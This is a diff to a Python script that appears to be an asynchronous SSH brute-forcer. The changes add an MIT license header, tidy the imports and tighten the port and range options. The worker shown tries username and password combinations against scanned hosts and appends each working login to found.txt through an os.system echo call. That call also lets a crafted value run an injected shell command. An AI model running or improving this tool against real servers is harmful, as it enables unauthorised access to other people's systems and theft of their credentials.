@@ -1,17 +1,36 @@
-import ipaddress
-import aiofiles
-import asyncssh
-import argparse
-import asyncio
-import random
-import time
-import sys
+# -*- coding: utf-8 -*-
+
+"""
+The MIT License (MIT)
+
+Copyright (c) 2019-2021 MrReacher
+
+Permission is hereby granted, free of charge, to any person obtaining a
+copy of this software and associated documentation files (the "Software"),
+to deal in the Software without restriction, including without limitation
+the rights to use, copy, modify, merge, publish, distribute, sublicense,
+and/or sell copies of the Software, and to permit persons to whom the
+Software is furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in
+all copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
+OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
+FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
+DEALINGS IN THE SOFTWARE.
+"""
+
 import os
-
-# debug, removing later
-# also note: remove useless prints
-
-import traceback
+import sys
+import time
+import asyncio
+import argparse
+import asyncssh
+import ipaddress
 
 from pathlib import Path
 
@@ -100,11 +119,12 @@ async def brute_worker(name, queue):
         for c in check:
             try:
                 result = await run_ssh(c, username, password)
-                found = f'[+] Found {c} -> {username}:{password} -> {result}'
-                print(found)
-                os.system(f'echo "{found}" >> found.txt')
             except Exception:
                 pass
+            else:
+                found = f'[+] Found {c} -> {username}:{password} -> {result}'
+                os.system(f'echo "{found}" >> found.txt')
+                print(found)
 
             #except (OSError, asyncio.TimeoutError, ConnectionRefusedError):
             #    pass
@@ -145,11 +165,10 @@ if __name__ == '__main__':
     parser.add_argument('--file', '-f', type=str, required=True)
     
     # optional arguments
-    # `port` can only be used with `range`
-    # `range` can only be used with `port`
+    # `port` can only be used with `range` and vice-versa
     # `combo` cannot be used with either `port` or `range`
-    parser.add_argument('--port', '-p', action='store_true')
-    parser.add_argument('--range', '-r', type=str)
+    parser.add_argument('--port', '-p', action='store_true', required='--range' in sys.argv)
+    parser.add_argument('--range', '-r', type=str, required='--port' in sys.argv)
     parser.add_argument('--combo', '-c', type=str)
     
     # default arguments
@@ -159,11 +178,15 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     file = args.file
+    port = args.port
     ranges = read_ips(file)
-    if not ranges:  
+    if not ranges:
+        if not port:
+            parser.error(f'file `{file}` is empty or does not exist. '
+                            'you should do a portscan instead')
+
         ranges = generate_range(args.range)
 
-    port = args.port
     combo = args.combo
     if combo:
         combos = read_combo(combo)
